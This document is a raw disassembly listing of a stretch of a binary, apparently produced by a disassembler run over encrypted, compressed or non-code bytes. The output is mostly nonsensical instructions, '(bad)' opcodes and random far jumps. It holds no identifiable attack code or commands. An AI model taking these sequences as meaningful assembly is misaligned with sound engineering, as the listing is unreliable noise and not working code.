  422e2d:	test   al,0x79
  422e2f:	xor    eax,0x219132d
  422e34:	ds dec ecx
  422e36:	jnp    0x422e91
  422e38:	jl     0x422eb7
  422e3a:	cmp    ebx,DWORD PTR [edi+esi*1+0x23820c40]
  422e41:	loop   0x422e99
  422e43:	mov    bh,0x7c
  422e45:	adc    esp,DWORD PTR [edx]
  422e47:	into   
  422e48:	arpl   WORD PTR [esi-0x1e74c4ec],bp
  422e4e:	sbb    eax,0x15829939
  422e53:	mov    eax,0x2b686915
  422e58:	sahf   
  422e59:	jmp    0x8809245c
  422e5e:	mov    bh,0xc9
  422e60:	dec    esi
  422e61:	sbb    edi,edx
  422e63:	fcomp  QWORD PTR [ecx-0x55]
  422e66:	test   DWORD PTR [edx+0x27],esp
  422e69:	jmp    0x422e81
  422e6b:	(bad)  [edi]
  422e6d:	jnp    0x422e02
  422e6f:	ins    DWORD PTR es:[edi],dx
  422e70:	hlt    
  422e71:	call   0x52e:0x5baba31e
  422e78:	add    esi,DWORD PTR [esi+0x6a37f971]
  422e7e:	jecxz  0x422e01
  422e80:	gs ds jbe 0x422eb3
  422e84:	dec    ebx
  422e85:	jno    0x422e5a
  422e87:	sahf   
  422e88:	dec    ebx
  422e89:	out    0x2f,eax
  422e8b:	js     0x422e84
  422e8d:	(bad)
  422e90:	ins    DWORD PTR es:[edi],dx
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x4bdc
  422f02:	dec    ebx
  422f03:	pushf  
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0xc8000001,al
  422f0d:	das    
  422f0e:	inc    edi
  422f0f:	and    DWORD PTR [edi+0x5e],esi
  422f12:	jg     0x422f1a
  422f14:	push   es
  422f15:	lods   al,BYTE PTR ds:[esi]
  422f16:	inc    edx
  422f17:	push   esp
  422f18:	jno    0x422f6a
  422f1a:	jg     0x422f71
  422f1c:	adc    BYTE PTR [ebx-0x67],bh
  422f1f:	add    BYTE PTR ds:0xb430f460,dl
  422f25:	fisttp WORD PTR ds:0x4788af52
  422f2b:	ret    0xd996
  422f2e:	push   esp
  422f2f:	nop
  422f30:	dec    edi
  422f31:	xchg   esp,eax
  422f32:	(bad)  
  422f34:	adc    DWORD PTR [eax+0x35],esi
  422f37:	jecxz  0x422ec1
  422f39:	(bad)  
  422f3b:	jmp    0x8576160b
  422f40:	pop    ebx
  422f41:	lds    edi,FWORD PTR [ecx]
  422f43:	(bad)  
  422f44:	cs scas al,BYTE PTR es:[edi]
  422f46:	repz es sbb eax,0x37c3357b
  422f4d:	pop    edi
  422f4e:	call   0xda1daca5
  422f53:	aaa    
  422f54:	std    
  422f55:	xor    edi,ebp
  422f57:	xchg   edi,eax
  422f58:	lods   eax,DWORD PTR ds:[esi]
  422f59:	or     bh,ch
  422f5b:	out    dx,al
  422f5c:	pop    ebp
  422f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f5e:	jnp    0x422f2c
  422f60:	int3   
  422f61:	mov    ch,0xe7
  422f63:	mov    bh,0xe1
  422f65:	mov    dh,0x7e
  422f67:	add    DWORD PTR [edi],esi
  422f69:	(bad)  
  422f6a:	push   ecx
  422f6b:	dec    edi
  422f6c:	jb     0x422f83
  422f6e:	and    al,0x98
  422f70:	jle    0x422f59
  422f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f73:	add    dh,dh
  422f75:	pop    edi
  422f76:	dec    ebx
  422f77:	mov    al,ds:0x3d8c1210
  422f7c:	test   eax,0x216da116
  422f81:	xchg   edi,eax
  422f82:	sub    DWORD PTR [ebx],ebp
  422f84:	adc    DWORD PTR ds:0xf584b309,ebx
  422f8a:	sub    al,0x5e
  422f8c:	inc    edi
  422f8d:	fcom   DWORD PTR [ebp+0x7c]
  422f90:	mov    al,0x90
  422f92:	xor    ebp,DWORD PTR [edx+0x4056d135]
  422f98:	or     ch,BYTE PTR [esp+ebp*1]
  422f9b:	ds test al,0xd1
  422f9e:	int3   
  422f9f:	fcom   DWORD PTR [edi-0x36aa73e7]
  422fa5:	add    DWORD PTR [eax+0xfd7cf4d],eax
  422fab:	mov    ch,0x5
  422fad:	call   0x25e0:0x282f9919
  422fb4:	push   es
  422fb5:	mov    ds:0xf32648a9,eax
  422fba:	mov    cl,0xf4
  422fbc:	test   DWORD PTR [ebp-0x567233f3],edx
  422fc2:	out    dx,al
  422fc3:	push   ds
  422fc4:	les    eax,FWORD PTR [eax-0x45]
  422fc7:	pusha  
  422fc8:	(bad)  
  422fc9:	aad    0xd6
  422fcb:	rcl    BYTE PTR [edi+0x26],0x1f
  422fcf:	dec    esp
  422fd0:	enter  0x5ca9,0x2b
  422fd4:	xor    eax,DWORD PTR [eax+0x56]
  422fd7:	mov    esp,DWORD PTR [edi+edx*4-0x27]
  422fdb:	xlat   BYTE PTR ds:[ebx]
  422fdc:	icebp  
  422fdd:	bound  esp,QWORD PTR [eax-0x5d98293a]
  422fe3:	add    edx,edx
  422fe5:	fild   DWORD PTR [edi-0xdc38ae1]
  422feb:	loope  0x42303f
  422fed:	call   0xcdd41a64
  422ff2:	stos   DWORD PTR es:[edi],eax
  422ff3:	data16 jo 0x423043
  422ff6:	adc    eax,0x14110a94
  422ffb:	pop    edx
  422ffc:	mov    ah,0x36
  422ffe:	aam    0x75
  423000:	aas    
  423001:	ja     0x422fc1
  423003:	ret    0xf78c
  423006:	shl    DWORD PTR fs:[edi],0x64
  42300a:	push   esp
  42300b:	sbb    al,0x15
  42300d:	ds out 0x87,eax
  423010:	add    DWORD PTR [eax],0x0
	...
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [esi+ebp*2+0x1caf267],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x42000001,al
  42308d:	dec    BYTE PTR [ebp+0x2f]
  423090:	jp     0x42307b
  423092:	mov    al,ds:0x9f45945c
  423097:	idiv   BYTE PTR [ebp+0x7b1ee436]
  42309d:	lds    eax,FWORD PTR [eax-0x45cf4bcb]
  4230a3:	call   0x78c2:0x160e6b41
  4230aa:	push   edx
  4230ab:	jns    0x4230e0
  4230ad:	leave  
  4230ae:	je     0x4230c4
  4230b0:	outs   dx,DWORD PTR ds:[esi]
  4230b1:	inc    esp
  4230b2:	fmul   DWORD PTR [ecx+ebp*1+0xe]
  4230b6:	sub    DWORD PTR cs:0xc2594f38,edi
  4230bd:	hlt    
  4230be:	repz push esp
  4230c0:	sub    ch,bl
  4230c2:	jl     0x4230eb
  4230c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230c5:	dec    edi
  4230c6:	or     cl,ch
  4230c8:	sbb    BYTE PTR [esi-0x6e],dh
  4230cb:	(bad)  
  4230cc:	sub    al,0x62
  4230ce:	jnp    0x423076
  4230d0:	fwait
  4230d1:	push   es
  4230d2:	test   al,0x65
  4230d4:	push   esp
  4230d5:	test   al,0xfd
  4230d7:	mov    edx,0x92d4047c
  4230dc:	lods   eax,DWORD PTR ds:[esi]
  4230dd:	mov    bh,BYTE PTR [ecx-0x1eba24cb]
  4230e3:	shl    DWORD PTR [ecx+0x6f72841f],cl
  4230e9:	mov    esi,0x4aa3e1cc
  4230ee:	ja     0x4230af
  4230f0:	loopne 0x4230f1
  4230f2:	fbstp  TBYTE PTR [ecx]
  4230f4:	fild   WORD PTR [ecx+0x44c92145]
  4230fa:	xlat   BYTE PTR ds:[ebx]
  4230fb:	loopne 0x4230db
  4230fd:	xor    eax,0x8ff73cd1
  423102:	sbb    al,0xfc
  423104:	and    ecx,DWORD PTR [edx-0x5315b5e7]
  42310a:	jmp    0x423100
  42310c:	jno    0x423111
  42310e:	add    BYTE PTR [ebp-0x36],al
  423111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423112:	leave  
  423113:	mov    bh,0x53
  423115:	stc    
  423116:	lea    ebp,[esi]
  423118:	sub    esp,esi
  42311a:	aaa    
  42311b:	loope  0x42316b
  42311d:	pop    edi
  42311e:	stc    
  42311f:	push   ds
  423120:	scas   eax,DWORD PTR es:[edi]
  423121:	ret    
  423122:	test   DWORD PTR [eax-0x22d56241],esp
  423128:	inc    eax
  423129:	stos   DWORD PTR es:[edi],eax
  42312a:	dec    ecx
  42312b:	mov    dh,0xe0
  42312d:	test   BYTE PTR [edx],bl
  42312f:	mov    ebp,0xb41d40ef
  423134:	int3   
  423135:	or     dl,cl
  423137:	sub    al,bl
  423139:	jl     0x42318a
  42313b:	je     0x4230e3
  42313d:	(bad)  
  42313e:	mov    ecx,0x53d0dcb9
  423143:	push   ds
  423144:	stos   BYTE PTR es:[edi],al
  423145:	dec    BYTE PTR [edx-0x37]
  423148:	loop   0x423121
  42314a:	addr16 jmp 0x423119
  42314d:	mov    bl,0xcf
  42314f:	daa    
  423150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423151:	stc    
  423152:	sbb    bl,BYTE PTR [ebx-0x70316688]
  423158:	es data16 mov al,0xfa
  42315c:	mov    dh,0x72
  42315e:	mov    al,0x21
  423160:	jl     0x42316e
  423162:	and    DWORD PTR [ebx-0x32],ebp
  423165:	and    BYTE PTR [edx+ecx*4],0xad
  423169:	add    ecx,DWORD PTR [edi+edx*8+0x4b]
  42316d:	ret    
  42316e:	push   cs
  42316f:	in     eax,dx
  423170:	outs   dx,DWORD PTR ds:[esi]
  423172:	mov    dl,BYTE PTR [eax-0x20]
  423175:	mov    esp,0xb3d4fe0d
  42317a:	lock or eax,0xd22fb455
  423180:	cmp    BYTE PTR [edi+ebp*2-0x659e80de],ch
  423187:	xor    al,0x9e
  423189:	pop    eax
  42318a:	pusha  
  42318b:	mov    ah,0xb8
  42318d:	push   eax
  42318e:	fcom   st(3)
  423190:	jne    0x423192
	...
  4231f2:	add    BYTE PTR [eax],al
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x17ef82a1],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x2d000001,al
  42320d:	mov    al,0x7
  42320f:	fld    DWORD PTR [edi-0x6254c73a]
  423215:	xchg   ebp,eax
  423216:	sub    edi,DWORD PTR [esi]
  423218:	ror    DWORD PTR [ebx],1
  42321a:	add    esi,DWORD PTR [esi]
  42321c:	xlat   BYTE PTR ds:[ebx]
  42321d:	ret    0xda50
  423220:	fadd   DWORD PTR ds:0xaf482d6f
  423226:	pop    edi
  423227:	and    edi,DWORD PTR [edi-0x3c]
  42322a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42322b:	push   edi
  42322c:	xchg   ecx,eax
  42322d:	test   BYTE PTR [ebx-0x3c04f077],dl
  423233:	inc    ebp
  423234:	arpl   WORD PTR [esi-0x238bf0f0],dx
  42323a:	sbb    eax,0xaf047b18
  42323f:	iret   
  423240:	das    
  423241:	sbb    DWORD PTR [eax-0x11c9aa2],ebp
  423247:	sbb    DWORD PTR ds:0xf995241e,0xffffffdf
  42324e:	xchg   edx,eax
  42324f:	sub    al,0x6b
  423251:	mov    eax,0x32c11e9c
  423256:	retf   
  423257:	xchg   ebx,eax
  423258:	jp     0x4232aa
  42325a:	mov    BYTE PTR [eax-0x4e],dh
  42325d:	sti    
  42325e:	pop    ebx
  42325f:	and    ah,BYTE PTR [eax]
  423261:	pop    esp
  423262:	xor    ch,cl
  423264:	addr16 cmp al,0x24
  423267:	push   ss
  423268:	aam    0xe3
  42326a:	sbb    ch,BYTE PTR [edx+0x33]
  42326d:	fwait
  42326e:	jnp    0x423273
  423270:	test   BYTE PTR [edi],dl
  423272:	sbb    DWORD PTR [ebx-0x2f21bc63],eax
  423278:	xchg   BYTE PTR [esp],dl
  42327b:	adc    eax,DWORD PTR [ecx+0x72]
  42327e:	and    DWORD PTR [ecx+0x52],esp
  423281:	push   esi
  423282:	jp     0x4232eb
  423284:	inc    ecx
  423285:	loope  0x423219
  423287:	push   es
  423288:	sbb    DWORD PTR [edi+0x1e049a51],edx
  42328e:	xlat   BYTE PTR ds:[ebx]
  42328f:	icebp  
  423290:	imul   ebx,DWORD PTR [edi],0xffffffb5
  423293:	mov    ebp,0x9540d9da
  423298:	sar    BYTE PTR [edx+0x59],cl
  42329b:	jb     0x42328c
  42329d:	mov    ebp,0xd5d0e495
  4232a2:	jb     0x423243
  4232a4:	ins    DWORD PTR es:[edi],dx
  4232a5:	test   al,0xbc
  4232a7:	adc    eax,esi
  4232a9:	std    
  4232aa:	leavew 
  4232ac:	retf   
  4232ad:	and    cl,BYTE PTR [ecx+0x3db71e1b]
  4232b3:	mov    dh,ch
  4232b5:	ins    DWORD PTR es:[edi],dx
  4232b6:	mov    DWORD PTR [esi-0x1afce218],0xc1326c8e
  4232c0:	xchg   edi,eax
  4232c1:	cmp    ecx,DWORD PTR [ecx]
  4232c3:	and    al,0xbd
  4232c5:	pop    esi
  4232c6:	push   eax
  4232c7:	test   dl,ch
  4232c9:	jp     0x42324d
  4232cb:	nop
  4232cc:	pop    ss
  4232cd:	cld    
  4232ce:	push   ds
  4232cf:	test   DWORD PTR [esi+0x73966b29],esp
  4232d5:	(bad)  [di]
  4232d8:	and    al,0xf9
  4232da:	int    0x2b
  4232dc:	mov    ah,BYTE PTR [ebx+edi*1]
  4232df:	retf   0x5c8d
  4232e2:	xor    bl,BYTE PTR [ebx]
  4232e4:	mov    edx,0x4032f9b7
  4232e9:	mov    ecx,0x388a69b8
  4232ee:	fwait
  4232ef:	add    BYTE PTR [ebx-0x65],ah
  4232f2:	scas   al,BYTE PTR es:[edi]
  4232f3:	jne    0x4232eb
  4232f5:	icebp  
  4232f6:	pushf  
  4232f7:	and    bl,al
  4232f9:	pop    ebx
  4232fa:	push   ds
  4232fb:	outs   dx,DWORD PTR ds:[esi]
  4232fc:	or     dl,0x78
  4232ff:	sub    DWORD PTR [ebx+0x1f0d0161],0x0
  423306:	ret    
  423307:	push   0xdf698b80
  42330c:	sbb    BYTE PTR [eax+0x68],dh
  42330f:	sub    ah,BYTE PTR [edi+0x0]
	...
  423372:	add    BYTE PTR [eax],al
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x448a0f44
  423382:	ins    DWORD PTR es:[edi],dx
  423383:	sbb    ecx,DWORD PTR [ebx]
  423385:	js     0x423388
  423387:	add    BYTE PTR ds:0x12000001,al
  42338d:	adc    eax,0x2352ff91
  423392:	in     eax,0xa1
  423394:	cmp    BYTE PTR [ebx],0x28
  423397:	mov    dh,0x8
  423399:	jmp    0x42333e
  42339b:	mov    eax,ds:0xe3f20d0f
  4233a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233a1:	push   0x75b00c6e
  4233a6:	es fucomi st,st(4)
  4233a9:	jnp    0x4233a7
  4233ab:	mul    BYTE PTR [ebp-0x6e]
  4233ae:	jecxz  0x423383
  4233b0:	nop
  4233b1:	jae    0x4233da
  4233b3:	lods   al,BYTE PTR ds:[esi]
  4233b4:	mov    ecx,0x2446a565
  4233b9:	aam    0xe8
  4233bb:	mov    ebp,0xddeb9a9f
  4233c0:	daa    
  4233c1:	fistp  WORD PTR [esi]
  4233c3:	out    dx,al
  4233c4:	mov    bh,0x26
  4233c6:	fdiv   QWORD PTR [esi-0x6b194e89]
  4233cc:	fs dec esp
  4233ce:	pop    edx
  4233cf:	(bad)  
  4233d0:	mov    ebx,0xc66a1c66
  4233d5:	mov    bl,BYTE PTR [ecx+edi*4+0x5086c905]
  4233dc:	shl    BYTE PTR [ebx-0x7a],1
  4233df:	pusha  
  4233e0:	addr16 es out 0x29,eax
  4233e4:	mov    bl,0xc8
  4233e6:	div    DWORD PTR [ecx-0x7f90397d]
  4233ec:	repnz add bl,al
  4233ef:	and    ebp,ecx
  4233f1:	push   ebx
  4233f2:	xchg   esi,eax
  4233f3:	xor    eax,0x90070abc
  4233f8:	sub    bl,BYTE PTR [edi]
  4233fa:	std    
  4233fb:	pop    ebp
  4233fc:	dec    esp
  4233fd:	xchg   BYTE PTR [eax],bh
  4233ff:	sbb    DWORD PTR [ebx-0x73],ecx
  423402:	or     ebp,DWORD PTR [edi+0x55122a9d]
  423408:	push   0x956d5bd7
  42340d:	mov    ebp,0x8bd9afdc
  423412:	and    ah,BYTE PTR [ebx]
  423414:	(bad)  
  423415:	mov    eax,0x3a99118
  42341a:	adc    DWORD PTR [edi],ecx
  42341c:	je     0x423485
  42341e:	cwde   
  42341f:	jmp    0xfada:0x3f03530e
  423426:	pop    edi
  423427:	popf   
  423428:	repnz out dx,al
  42342a:	fwait
  42342b:	ss (bad) 
  42342d:	push   cs
  42342e:	pop    edi
  42342f:	retf   
  423430:	stc    
  423431:	pop    edi
  423432:	je     0x4234a4
  423434:	cs js  0x42342a
  423437:	das    
  423438:	fmul   QWORD PTR [ecx]
  42343a:	cmp    al,0xd5
  42343c:	pop    ebx
  42343d:	sub    DWORD PTR [edi+0x4],ebp
  423440:	cli    
  423441:	pop    eax
  423442:	push   edx
  423443:	data16 lahf 
  423445:	dec    eax
  423446:	jmp    0x83bc59d2
  42344b:	mov    ch,0xf
  42344d:	leave  
  42344e:	clc    
  42344f:	mov    ds:0x7da75efb,eax
  423454:	xor    eax,0xf5839d0e
  423459:	fidivr DWORD PTR [esi+0x46]
  42345c:	jno    0x423420
  42345e:	mov    edx,0x2498814f
  423463:	cwde   
  423464:	push   ecx
  423465:	push   0x5c06aa37
  42346a:	push   ss
  42346b:	fstp   QWORD PTR [edx]
  42346d:	jge    0x4234eb
  42346f:	iret   
  423470:	hlt    
  423471:	(bad)  [ebx*8+0x3c8f6175]
  423478:	mov    ds:0x544279b2,al
  42347d:	mov    eax,ds:0x478765a2
  423482:	mov    esi,esp
  423484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423485:	jnp    0x423458
  423487:	je     0x4234fe
  423489:	fisubr WORD PTR [ebx]
  42348b:	std    
  42348c:	std    
  42348d:	das    
  42348e:	retf   0xc65f
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xb91f:0xadf467bf
  423501:	inc    esp
  423502:	loope  0x423572
  423504:	adc    BYTE PTR [ecx+0x1],bh
  423507:	add    BYTE PTR ds:0x4e000001,al
  42350d:	or     eax,0xd11e00e9
  423512:	mov    al,BYTE PTR [edi-0x2b782820]
  423518:	sub    al,0xd5
  42351a:	retf   
  42351b:	scas   eax,DWORD PTR es:[edi]
  42351c:	sub    eax,DWORD PTR [esi-0x34e10746]
  423522:	mov    eax,0x3089a5b6
  423527:	scas   eax,DWORD PTR es:[edi]
  423528:	sub    bh,BYTE PTR [eax+eax*2-0x2b8f115d]
  42352f:	or     bl,BYTE PTR [esi-0x7e]
  423532:	and    dl,cl
  423534:	sar    ebp,0x77
  423537:	xchg   ecx,eax
  423538:	jg     0x4234c0
  42353a:	cmp    ebp,0x2fb625b6
  423540:	sub    dh,bh
  423542:	repz dec ebp
  423544:	jae    0x423570
  423546:	or     bh,dh
  423548:	das    
  423549:	jle    0x4234cf
  42354b:	mov    dl,0xe8
  42354d:	nop
  42354e:	mov    al,0x30
  423550:	daa    
  423551:	and    BYTE PTR [eax-0x4326e380],al
  423557:	test   dl,dh
  423559:	idiv   DWORD PTR [esi]
  42355b:	cmp    esp,eax
  42355d:	jb     0x423545
  42355f:	ja     0x4234ff
  423561:	xchg   edx,eax
  423562:	test   DWORD PTR [edx],edi
  423564:	sbb    DWORD PTR [ebp-0x1318e99f],0xfffffff1
  42356b:	mov    ebx,0xe5ff3567
  423570:	push   ebp
  423571:	sbb    bl,BYTE PTR [edi]
  423573:	xchg   ebp,eax
  423574:	xchg   ecx,eax
  423575:	gs ret 0x2269
  423579:	jae    0x42359c
  42357b:	xor    dh,BYTE PTR [edi+0x39cca2af]
  423581:	push   esi
  423582:	jl     0x423601
  423584:	mov    ebp,0x5a7d135f
  423589:	adc    dl,BYTE PTR [ebp+edi*8-0xb8e4ee8]
  423590:	inc    ebp
  423591:	jbe    0x423599
  423593:	ret    
  423594:	pop    esi
  423595:	inc    esp
  423596:	call   FWORD PTR [eax-0x57]
  423599:	in     al,0x9d
  42359b:	stc    
  42359c:	popf   
  42359d:	test   DWORD PTR [eax],ebp
  42359f:	(bad)  
  4235a0:	gs inc edi
  4235a2:	xchg   ebx,eax
  4235a3:	test   BYTE PTR [eax-0x3a],bh
  4235a6:	jecxz  0x42354d
  4235a8:	ror    DWORD PTR [ebx+0xf],1
  4235ab:	mov    cl,0xc9
  4235ad:	ins    BYTE PTR es:[edi],dx
  4235ae:	pushf  
  4235af:	jmp    0x67a1:0x5841f24
  4235b6:	outs   dx,BYTE PTR ds:[esi]
  4235b7:	(bad)  
  4235b8:	xchg   ebx,eax
  4235b9:	and    ah,BYTE PTR [esi]
  4235bb:	push   ecx
  4235bc:	pop    ss
  4235bd:	rol    BYTE PTR [ecx+0x12b892c],1
  4235c3:	adc    eax,0x32c53569
  4235c8:	nop
  4235c9:	mov    ds:0x6dc6357f,al
  4235ce:	ja     0x423638
  4235d0:	pop    ebp
  4235d1:	into   
  4235d2:	pop    ebx
  4235d3:	fcom   QWORD PTR [ebx+edx*2]
  4235d6:	add    al,0xae
  4235d8:	sti    
  4235d9:	sbb    DWORD PTR ds:0xbf00eabc,edx
  4235df:	cmp    bh,ah
  4235e1:	popf   
  4235e2:	scas   al,BYTE PTR es:[edi]
  4235e3:	nop
  4235e4:	shl    DWORD PTR [eax+0x7b],0x7a
  4235e8:	sbb    al,0xf5
  4235ea:	jns    0x4235d9
  4235ec:	add    al,0x40
  4235ee:	push   ecx
  4235ef:	ins    DWORD PTR es:[edi],dx
  4235f0:	aaa    
  4235f1:	bound  edx,QWORD PTR [eax+ecx*4]
  4235f4:	cmp    bh,BYTE PTR [edx]
  4235f6:	cmc    
  4235f7:	mov    bh,0xaf
  4235f9:	mov    dh,0x47
  4235fb:	mov    ?,WORD PTR [eax-0x14]
  4235fe:	push   0xffffffd9
  423600:	(bad)  
  423601:	fidivr WORD PTR gs:[ecx+0x2e684e58]
  423608:	ins    DWORD PTR es:[edi],dx
  423609:	inc    ebx
  42360a:	outs   dx,BYTE PTR ds:[esi]
  42360b:	cmc    
  42360c:	or     eax,0xf1aad3be
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x290abd13
  423683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423684:	adc    eax,0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    al,bl
  42368d:	or     esp,esi
  42368f:	fs fdivp st(3),st
  423692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423693:	fsubr  st(1),st
  423695:	mov    DWORD PTR [ebp+0x64bda109],ebp
  42369b:	rcr    BYTE PTR [edx+ebx*8],cl
  42369e:	push   cs
  42369f:	lods   al,BYTE PTR ds:[esi]
  4236a0:	mov    al,ds:0x32a0aa68
  4236a5:	mov    ds:0xb1861cfd,al
  4236aa:	loope  0x42364d
  4236ac:	jae    0x4236bb
  4236ae:	pop    ecx
  4236af:	or     al,0x7e
  4236b1:	ret    0x3c45
  4236b4:	lods   eax,DWORD PTR ds:[esi]
  4236b5:	sbb    al,0x59
  4236b7:	dec    ebx
  4236b8:	mov    ds:0x95b16be2,al
  4236bd:	stos   BYTE PTR es:[edi],al
  4236be:	gs and al,0x8f
  4236c1:	jl     0x423691
  4236c3:	dec    ebx
  4236c4:	iret   
  4236c5:	cmp    edx,0x11
  4236c8:	out    0xea,eax
  4236ca:	add    esi,DWORD PTR [ebx-0x1f]
  4236cd:	fnstcw WORD PTR [ebp-0x6d]
  4236d0:	in     al,0xee
  4236d2:	mov    esi,esi
  4236d4:	jns    0x42369e
  4236d6:	mov    al,ds:0x41fda2d6
  4236db:	push   esp
  4236dc:	ins    DWORD PTR es:[edi],dx
  4236dd:	ror    DWORD PTR [edi+0x4],1
  4236e0:	stc    
  4236e1:	test   al,0x9b
  4236e3:	ror    DWORD PTR [ebx+0x76],0xf0
  4236e7:	fimul  WORD PTR [edi]
  4236e9:	sbb    al,0x3b
  4236eb:	stos   DWORD PTR es:[edi],eax
  4236ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236ed:	pop    esp
  4236ee:	push   esp
  4236ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236f0:	in     al,dx
  4236f1:	jl     0x4236f3
  4236f3:	inc    edx
  4236f4:	mov    eax,ds:0xff0ed64e
  4236f9:	push   ss
  4236fa:	jp     0x4236e6
  4236fc:	sar    eax,0x47
  4236ff:	or     eax,0x702b775c
  423704:	xchg   ecx,eax
  423705:	mov    ebx,0xe9edc1d9
  42370a:	stc    
  42370b:	ds jnp 0x423695
  42370e:	cmp    ch,BYTE PTR ds:0x6d397442
  423714:	lods   eax,DWORD PTR ds:[esi]
  423715:	push   ebp
  423716:	sub    al,0xdf
  423718:	dec    edx
  423719:	(bad)  
  42371a:	adc    al,0x9f
  42371c:	mov    al,ds:0x22ae41de
  423721:	mov    ch,0xd9
  423723:	lods   al,BYTE PTR ds:[esi]
  423724:	jnp    0x423791
  423726:	mov    dh,0x57
  423728:	repnz mov ebx,0xac8ff43d
  42372e:	add    edi,esi
  423730:	push   ds
  423731:	jecxz  0x423713
  423733:	jne    0x4236fb
  423735:	cs loop 0x423723
  423738:	pop    ebp
  423739:	rcl    BYTE PTR [eax+edx*4-0x3a],cl
  42373d:	int    0x88
  42373f:	enter  0xe56,0xe9
  423743:	addr16 out dx,eax
  423745:	icebp  
  423746:	(bad)  
  423748:	ror    BYTE PTR cs:[ebx-0x44],0x2d
  42374d:	ds dec esp
  42374f:	mov    al,0xea
  423751:	div    BYTE PTR [esi]
  423753:	retf   
  423754:	and    dl,BYTE PTR [edx-0x67]
  423757:	or     eax,0x6c1f7356
  42375c:	imul   eax,DWORD PTR [edx-0x68c1283],0x6dee0be2
  423766:	out    0x49,eax
  423768:	push   DWORD PTR [ebp-0x3c]
  42376b:	add    cl,bh
  42376d:	call   0x4df4:0xa8a0a2d2
  423774:	mov    ebp,DWORD PTR [ebx+eiz*2+0x1a4e7275]
  42377b:	push   0x18924b59
  423780:	lods   eax,DWORD PTR ds:[esi]
  423781:	dec    edi
  423782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423783:	mov    ch,0x4e
  423785:	inc    ecx
  423786:	and    DWORD PTR [edi-0x77],edx
  423789:	dec    edi
  42378a:	lds    esp,FWORD PTR [edx-0x25511b2d]
  423790:	dec    ebx
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x44a15055
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x83000001
  42380d:	cmp    ebp,DWORD PTR ss:[esi]
  423810:	sub    ebp,DWORD PTR [ecx-0x6b2e21a9]
  423816:	clc    
  423817:	pop    ss
  423818:	fdivr  QWORD PTR [ebx-0x10dd1ec7]
  42381e:	data16 aaa 
  423820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423821:	or     edx,ebp
  423823:	aaa    
  423824:	mov    DWORD PTR [ebx],0xa8ffeb43
  42382a:	xor    ah,BYTE PTR [eax-0x70190407]
  423830:	adc    eax,0xee281e40
  423835:	pop    ss
  423836:	inc    edx
  423837:	xchg   ebx,eax
  423838:	xor    DWORD PTR [eax],esi
  42383a:	push   ecx
  42383b:	fs (bad) 
  42383d:	sbb    al,0x0
  42383f:	adc    ebp,DWORD PTR [ecx-0x30ef7156]
  423845:	add    ch,BYTE PTR [ecx+0x3c4f0e69]
  42384b:	cdq    
  42384c:	jmp    0x42387b
  42384e:	loop   0x42383d
  423850:	js     0x4238c6
  423852:	(bad)
  423856:	retf   
  423857:	add    BYTE PTR [edx-0x1f],cl
  42385a:	mov    cl,0xde
  42385c:	mov    dl,0xfc
  42385e:	and    DWORD PTR [ebp+0x6c],ebx
  423861:	jnp    0x4238d7
  423863:	jne    0x42381b
  423865:	mov    al,0x3
  423867:	push   0x58
  423869:	es xchg edx,eax
  42386b:	push   ds
  42386c:	push   0xffffffd1
  42386e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42386f:	mov    al,ds:0xd9c2aa35
  423874:	stos   DWORD PTR es:[edi],eax
  423875:	inc    DWORD PTR [esp+eiz*4]
  423878:	sbb    dh,dh
  42387a:	retf   
  42387b:	mov    ch,0x6c
  42387d:	inc    ebp
  42387e:	scas   al,BYTE PTR es:[edi]
  42387f:	int    0xc8
  423881:	push   es
  423882:	add    DWORD PTR [edi],ebp
  423884:	jle    0x42388b
  423886:	push   edi
  423887:	dec    esp
  423888:	xor    bh,BYTE PTR [esi]
  42388a:	xor    DWORD PTR [edi+0x2e],eax
  42388d:	sar    esp,cl
  42388f:	xchg   ecx,eax
  423890:	or     DWORD PTR [ebx-0xf5134fd],esi
  423896:	sahf   
  423897:	(bad)  [ebx+ebp*2-0x7abb96ee]
  42389e:	lods   al,BYTE PTR ds:[esi]
